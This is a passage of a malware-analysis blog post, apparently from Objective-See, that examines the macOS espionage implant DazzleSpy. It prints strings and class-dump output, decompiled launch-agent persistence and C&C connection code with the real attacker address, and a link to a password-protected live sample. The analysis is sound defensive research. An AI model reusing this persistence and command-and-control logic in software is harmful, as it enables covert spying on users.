<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x6D/wys.png />
<meta name="twitter:title" content=Analyzing&#32;OSX.DazzleSpy />
<meta name="twitter:description" content=A&#32;fully-featured&#32;cyber-espionage&#32;macOS&#32;implant />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Analyzing&#32;OSX.DazzleSpy />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x6D/wys.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Analyzing OSX.DazzleSpy</div>
  <div class="blogSubTitle">A fully-featured cyber-espionage macOS implant</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / January 25, 2022</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;">Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as:</div>
    <center>
        <div class="logo-link">
            <a href="https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect" style="border: 0px;">
                <img src="https://objective-see.com/images/friends/textless/jamf.png" height="64px;">
                <br>
                <div class="logo-title">Jamf</div>
            </a>
        </div>
        <div class="logo-link">
            <a href="https://mosyle.com/" style="border: 0px;">
                <img src="https://objective-see.com/images/friends/textless/mosyle.png" height="66px;">
                <br>
                <div class="logo-title">Mosyle</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="http://kandji.io/" style="border: 0px;">
                <img src="https://objective-see.com/images/friends/textless/kandji.png" height="64px;">
                <br>
                <div class="logo-title">Kandji</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://macpaw.com/cleanmymac" style="border: 0px;">
                <img src="https://objective-see.com/images/friends/textless/cmm.png" height="64px;">
                <br>
                <div class="logo-title">CleanMyMac X</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://l.kolide.co/3xXBPaY" style="border: 0px;">
                <img src="https://objective-see.com/images/friends/textless/kolide.png" height="66px;">
                <br>
                <div class="logo-title">Kolide</div>
            </a>
        </div>
    </center>
</div>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve uploaded an OSX.DazzleSpy <a href="https://objective-see.com/downloads/malware/DazzleSpy.zip">sample</a> (password: infect3d) to our macOS malware collection.</p>
<div align="right" style="padding-right:10px; padding-bottom:10px;">
...please don’t infect yourself! 
</div>
</div>
<br>
<h3 id="background">Background</h3>
<p>Recently (as in this morning), researchers <a href="https://twitter.com/marc_etienne_">Marc-Etienne M.Léveillé</a> and <a href="https://twitter.com/cherepanov74">Anton Cherepanov</a> of ESET published an intriguing report titled, &ldquo;<a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">Watering hole deploys new macOS malware, DazzleSpy, in Asia</a>&rdquo;:</p>
<img src="../images/blog/blog_0x6D/eset.png"  width="100%" class="center" style="border-radius: 4px;">

<p>In this excellent report, they detail both the exploit and macOS payload used to target pro-democracy users in Hong Kong:</p>
<blockquote>
  "<i>[A] Hong Kong pro-democracy radio station website [was] compromised to serve a Safari exploit that installed cyberespionage malware on site visitors' Macs. Here we provide a breakdown of the WebKit exploit used to compromise Mac users and an analysis of the payload, which is a new malware family targeting macOS.</i>" -ESET 
</blockquote>
<p>I was interested in digging a bit deeper into the macOS implant, as well as seeing how it stacked up against Objective-See&rsquo;s <a href="https://objective-see.com/products.html">free open-source tools</a>.</p>
<div class="note">
📚 Interested in general Mac malware analysis techniques?
<br>
<table style="border: 0px;">
  <tr>
    <td>
      <img src="../images/blog/blog_0x6B/book.png" height="200px;">
    </td>
    <td style="border: 0px;">
    You're in luck, as I've written an entire (free) book on this very topic:
    <br><br>
  <center>
  <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
  </center>
  </td>
  </tr>
</table>
</div>
<br>
<br>
<h3 id="triage">Triage</h3>
<p>ESET&rsquo;s report provided a hash for the decrypted macOS implant, <code>OSX.DazzleSpy</code>: <code>EE0678E58868EBD6603CC2E06A134680D2012C1B</code></p>
<p>They noted that this file is dropped by the Safari exploit (and persisted on disk as <code>softwareupdate</code>).</p>
<p>Popping over to VirusTotal, we can grab a copy of DazzleSpy:
<img src="../images/blog/blog_0x6D/vt.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">DazzleSpy ...on VirusTotal</center>
</p>
<p>It was first submitted to VirusTotal on <code>2022-01-26</code> and at that time, only detected by ESET.</p>
<p>Using macOS&rsquo; built-in <code>file</code> utility, we can see that this item is a standard mach-O binary:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file DazzleSpy/softwareupdate 
softwareupdate: Mach-O 64-bit executable x86_64
</pre>
</div>
<p>As its not compiled for arm64, it will not run <em>natively</em> on Apple&rsquo;s new M1 chips. Of course, thanks to Rosetta2 (Apple&rsquo;s intel -&gt; arm &ldquo;translator&rdquo;), the malware will still likely run on such systems.</p>
<p>Via <a href="https://objective-see.com/products/whatsyoursign.html"><code>WhatsYourSign</code></a>, my open-source utility that displays code-signing information via the UI, we can see that the malware is unsigned:</p>
<p><img src="../images/blog/blog_0x6D/wys.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">DazzleSpy ...is unsigned</center>

<br></p>
<div class="note">
The ESET report, notes that the exploit will "remove the com.apple.quarantineattribute from the file [malware] to avoid [macOS] asking the user to confirm the launch of the unsigned executable"
</div>
<p>Now let&rsquo;s run the <code>strings</code> utility to extracted any embedded (ASCII) strings:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% strings - DazzleSpy/softwareupdate
...

networksetup -listallhardwareports
/Library/.local
csrutil status
System Integrity Protection status: disabled.

IOPlatformUUID
IOPlatformSerialNumber

ProductVersion
Asia/Shanghai
...

88.218.192.128:5633
...

%@/.local
%@/softwareupdate
%@/Library/LaunchAgents
/com.apple.softwareupdate.plist
launchctl unload %@
RunAtLoad
KeepAlive

dumpKeychain
.local/security/keystealDaemon

docx
xltx
pptx
...
pages
numbers
text
%@/.local/SearchFiles

+[Singleton installDaemon]
-[Singleton shellClass]
-[Singleton processClass]
-[Singleton keychainClass]
-[Singleton remoteDesktopClass]
-[Singleton updateClass]
-[Singleton fileClass]
-[Singleton fileClassWriteData:]
-[Singleton recoveryClass]

/Users/wangping/pangu/create_source/poke/osxrk_commandLine/exec.m
/Users/wangping/pangu/create_source/poke/osxrk_commandLine/exec.o
...

</pre>
</div>
<p>The output from <code>strings</code> is rather telling and includes:</p>
<ul>
<li>
<p>What appears to be survey API calls and strings: <code>listallhardwareports</code>, <code>IOPlatformSerialNumber</code>, etc.</p>
</li>
<li>
<p>An embedded address, <code>88.218.192.128:5633</code> likely the malware&rsquo;s C&amp;C server.</p>
</li>
<li>
<p>Strings related to launch item persistence: <code>%@/Library/LaunchAgents</code>, <code>/com.apple.softwareupdate.plist</code>, <code>RunAtLoad</code>, etc.</p>
</li>
<li>
<p>Strings that appear to be related to dumping the user keychain, searching for files (via extension), etc. etc.</p>
</li>
<li>
<p>Objective-C class and method names (such as a <code>Singleton</code> class with references to other interesting classes).</p>
</li>
<li>
<p>Paths containing a user name, and perhaps the internal name of the malware (<code>osxrk</code>).</p>
</li>
</ul>
<p>We can also run macOS&rsquo; <code>otool</code> command with the <code>-L</code> flag to determine the dynamic libraries that DazzleSpy is linked against:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% otool -L DazzleSpy/softwareupdate
softwareupdate:
    /System/Library/Frameworks/VideoToolbox.framework/Versions/A/VideoToolbox
    /System/Library/Frameworks/AVFoundation.framework/Versions/A/AVFoundation 
    /System/Library/Frameworks/IOKit.framework/Versions/A/IOKit
    /System/Library/Frameworks/CoreWLAN.framework/Versions/A/CoreWLAN
    ...
    /System/Library/Frameworks/CFNetwork.framework/Versions/A/CFNetwork
    /System/Library/Frameworks/CoreMedia.framework/Versions/A/CoreMedia 
    /System/Library/Frameworks/Security.framework/Versions/A/Security
    /System/Library/Frameworks/CoreVideo.framework/Versions/A/CoreVideo
</pre>
</div>
<p>Based on the linked libraries, we can gain some likely insight into the malware&rsquo;s capabilities. For example, it links again the <code>AVFoundation</code> framework to implement remote desktop (RDP) capabilities.</p>
<p>Finally, as we saw various Objective-C classes and methods names in the output from <code>strings</code>, lets run reconstruct these via <a href="http://stevenygard.com/projects/class-dump/"><code>class-dump</code></a>. Abridged output is below:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% class-dump DazzleSpy/softwareupdate
...

@interface Exec : NSObject
{
}
+ (id)doShellInCmd:(id)arg1;
@end


@interface Singleton : NSObject <GCDAsyncSocketDelegate>
{
   ...
}

+ (void)installDaemon;
...
@end

@interface FileSearchClassObject : NSObject
{
    NSTask *_searchTask;
    NSMutableString *_searchString;
    NSDictionary *_searchDict;
    ...
}
...
- (void)searchFile:(id)arg1;
...
@end

@interface RemoteDesktopClassObject : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate, H264EncodeCallBackDelegate>
{
    AVCaptureSession *captureSession;
    AVCaptureConnection *connectionVideo;
    H264EncodeTool *_h264Encoder;
    MouseClassObject *_mouse;
}
...
- (void)restartRDP;
- (void)mouseEventDict:(id)arg1;
- (void)stopRemoteDesktop;
- (void)startRemoteDesktop:(CDUnknownBlockType)arg1;
- (void)captureOutput:(id)arg1 didOutputSampleBuffer:(struct opaqueCMSampleBuffer *)arg2 fromConnection:(id)arg3;

@end

@interface KeychainClassObject : NSObject
{
}

+ (void)unzipFile:(id)arg1 toPath:(id)arg2;
- (id)getPasswordFromSecKeychainItemRef:(struct __SecKeychainItem *)arg1;
- (id)getPass:(id)arg1 cmdTo:(id)arg2;
...
@end

</pre>
</div>
<p>Simply from these class and method names, we can gain significant insight into the malware&rsquo;s likely capabilities. Of course, we should confirm that the class/method names do indeed match their logic. For example, does the <code>installDaemon</code> really persist the malware? &hellip;let&rsquo;s find out!</p>
<h3 id="persistence">Persistence</h3>
<p>The ESET researchers noted:</p>
<blockquote>
  "<i>In order to persist on the compromised device, the malware adds a Property List file ... named com.apple.softwareupdate.plist to the LaunchAgents folder. The malware executable file is named softwareupdate and saved in the $HOME/.local/ folder.</i>" -ESET 
</blockquote>
<p>Recall that from the <code>strings</code> output, we saw strings such as <code>%@/Library/LaunchAgents</code> and <code>com.apple.softwareupdate.plist</code>.</p>
<p>In a disassembler, we find cross-references to these strings in the aforementioned <code>installDaemon</code> method (of the class named <code>Singleton</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">/* @class Singleton */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">+</span>(<span style="color:#66d9ef">void</span>)installDaemon {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>rax <span style="color:#f92672">=</span> NSHomeDirectory();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>var_78 <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;%@/Library/LaunchAgents&#34;</span>, rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>var_80 <span style="color:#f92672">=</span> [var_78 stringByAppendingFormat:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;/com.apple.softwareupdate.plist&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#66d9ef">if</span> ([var_70 fileExistsAtPath:var_78] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    [var_70 createDirectoryAtPath:var_78 withIntermediateDirectories:<span style="color:#ae81ff">0x1</span> ...];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>var_90 <span style="color:#f92672">=</span> [[NSMutableDictionary alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>var_98 <span style="color:#f92672">=</span> [[NSMutableArray alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>[var_98 addObject:var_38];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>[var_98 addObject:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;1&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>rax <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">@</span>(YES);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>[var_90 setObject:rax forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;RunAtLoad&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>rax <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">@</span>(YES);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>[var_90 setObject:rax forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;KeepAlive&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>rax <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">@</span>(YES);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>[var_90 setObject:rax forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;SuccessfulExit&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>[var_90 setObject:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;com.apple.softwareupdate&#34;</span> forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;Label&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>[var_90 setObject:var_98 forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;ProgramArguments&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>[var_90 writeToFile:var_80 atomically:<span style="color:#ae81ff">0x0</span>];</span></span></code></pre></div>
<p>In the above decompilation, we first see the malware build the path to a launch agent plist (<code>~/Library/LaunchAgents/com.apple.softwareupdate.plist</code>).</p>
<p>Then, it initializes a dictionary for the launch agent plist, with various key value pairs (<code>RunAtLoad</code>, etc). Once initialized this dictionary is written out to the launch agent plist (<code>com.apple.softwareupdate.plist</code>).</p>
<p>We can passively observe the malware (recall, named <code>softwareupdate</code>) dynamically creating this plist via a <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist",
    
    "process" : {
      "signing info (computed)" : {
        "signatureStatus" : -67062
      },
      "uid" : 501,
      "arguments" : [
        "/Users/user/Desktop/softwareupdate"
      ],
      "path" : "/Users/user/Desktop/softwareupdate",
      "pid" : 1469
    }
  }
}

</pre>
</div>
<p>Once the malware&rsquo;s launch agent&rsquo;s plist has been created, we can easily dump its contents:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% cat /Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.apple.softwareupdate&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/user/.local/softwareupdate&lt;/string&gt;
        &lt;string&gt;1&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;SuccessfulExit&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;

</pre>
</div>
<p>In the <code>ProgramArguments</code> key we can see the path to the persistent location of the malware: <code>~/.local/softwareupdate</code>. Also, as the <code>RunAtLoad</code> key is set to <code>true</code>, the malware will be automatically restarted each time the user logs in. Persistence achieved!</p>
<h3 id="campc-communications-and-capabilities">C&amp;C Communications and Capabilities</h3>
<p>The ESET <a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">report</a> notes that the malware will connect to <code>88.218.192.128</code> on port <code>5633</code>:</p>
<blockquote>
  "<i>DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.</i>" -ESET 
</blockquote>
<p>Recall that we saw this ip address/port in the output of <code>strings</code>, meaning that it is directly hardcoded into the malware. In a disassembler, we can see it is referenced in the malware&rsquo;s <code>main</code> method:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_main</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    commandAndControl <span style="color:#f92672">=</span> [[NSString alloc] initWithUTF8String:<span style="color:#e6db74">&#34;88.218.192.128:5633&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    singleton <span style="color:#f92672">=</span> [Singleton sharedInstance];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    var_40 <span style="color:#f92672">=</span> [commandAndControl componentsSeparatedByString:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;:&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#66d9ef">if</span> ([var_40 count] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        ip <span style="color:#f92672">=</span> [var_40 objectAtIndexedSubscript:<span style="color:#ae81ff">0x0</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        port <span style="color:#f92672">=</span> [var_40 objectAtIndexedSubscript:<span style="color:#ae81ff">0x1</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>                    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    [singleton setSocketHost:ip];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    [singleton setSocketPort:port];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    ...</span></span></code></pre></div>
<p>Specifically the hardcoded ip address and port string is first split (on <code>:</code>), and then the ip address is passed to the <code>setSocketHost:</code> method, while the port, to the <code>setSocketPort:</code> method.</p>
<p>The ESET <a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">report</a> also describes the tasking (remote) commands that DazzleSpy supports. This includes everything you&rsquo;d expect to find in a cyber-espionage implant, including surveying the infected host, exfiltrating files, running commands, self-deletion.</p>
<p>Interestingly, the malware (again, as noted by ESET), also supports more advanced features such as:</p>
<ul>
<li>
<p>The ability to search for files (via regex?)</p>
</li>
<li>
<p>The ability to start fully interactive remote desktop (RDP) session</p>
</li>
<li>
<p>The ability to dump the keychain (on systems vulnerable to <code>CVE-2019-8526</code>).</p>
</li>
</ul>
<div class="note">
<p>CVE-2019-8526 was found by Linus Henze, and presented at our very own #OBTS v2.0.</p>
<p>See:</p>
<center>
<a href="https://objectivebythesea.com/v2/talks/OBTS_v2_Henze.pdf">
      KeySteal: A Vulnerability in Apple's Keychain 
</a>
</center>
</div>
<p>The handling of remote commands (tasking) seems to be implemented in the <code>analysisData: Socket:</code> method. Here the malware looks for tasking commands from the command and control server, and then acts upon them. For example, here&rsquo;s the decompilation of the <code>run</code> command, which opens (&ldquo;runs&rdquo;) a specified file (&ldquo;path&rdquo;) via its default handler (via <code>NSWorkspace</code>&rsquo;s&rsquo; <code>openFile</code> API):</p>
